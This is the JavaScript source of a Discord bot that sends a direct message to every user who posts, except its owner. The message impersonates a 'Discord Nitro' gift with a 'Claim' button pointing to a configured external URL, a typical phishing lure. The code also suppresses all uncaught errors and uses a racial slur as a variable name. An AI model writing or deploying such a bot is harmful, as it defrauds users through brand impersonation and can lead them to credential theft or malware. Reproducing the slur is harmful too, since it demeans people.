const Discord = require('discord.js')
const client = new Discord.Client()
const config = require('./config')
const disbut = require('discord-buttons')
disbut(client)
client.on('ready',()=>{
    console.log("Bot is on")
})
process.on('uncaughtException', err => {})
client.on('message',async (message)=>{
    var embed = new Discord.MessageEmbed().setAuthor("Discord Nitro")
    .setColor(0x995C81).setImage('https://cdn.discordapp.com/attachments/1002195883351351438/1006218606595547238/11111unknown.png')
    /* .addFields(
		{ name: 'Discord has gifted you Nitro **Boosts** for 1 **year**!', value: 'Expires in 46 hours' }
	)
    */
    var nigga = new disbut.MessageButton().setStyle("url").setLabel("Claim").setDisabled(false).setURL(config.Url)
    var row = new disbut.MessageActionRow();
    row.addComponent(nigga);
    if (message.author.id != config.OwnerID){
    await message.author.send(`<@${message.author.id}> ${config.Message}`)
    await message.author.send(embed, { component: row })
    return;
    } try {
        console.log("err handled")
    } catch (err) {
        console.log("haha")
        
    }
})

client.login(config.Token)